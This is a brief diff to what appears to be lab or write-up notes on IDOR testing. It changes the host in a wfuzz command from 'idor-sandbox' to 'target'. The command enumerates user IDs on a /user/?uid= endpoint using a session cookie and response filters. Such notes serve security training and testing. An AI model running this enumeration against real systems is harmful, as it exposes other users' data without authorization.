@@ -11,7 +11,7 @@ wfuzz -c -z file,/usr/share/seclists/Fuzzing/5-digits-00000-99999.txt \
 ```
 
 ```shell
-wfuzz -c -z file,/usr/share/SecLists/Fuzzing/uid_range_15990_32000.txt --hc 404 --hh 2873 -H "Cookie: PHPSESSID=df1ff45401a6cc7e027d55d7a66587bb" http://idor-sandbox:80/user/?uid=FUZZ
+wfuzz -c -z file,/usr/share/SecLists/Fuzzing/uid_range_15990_32000.txt --hc 404 --hh 2873 -H "Cookie: PHPSESSID=df1ff45401a6cc7e027d55d7a66587bb" http://target:80/user/?uid=FUZZ
 ```
 
 ---
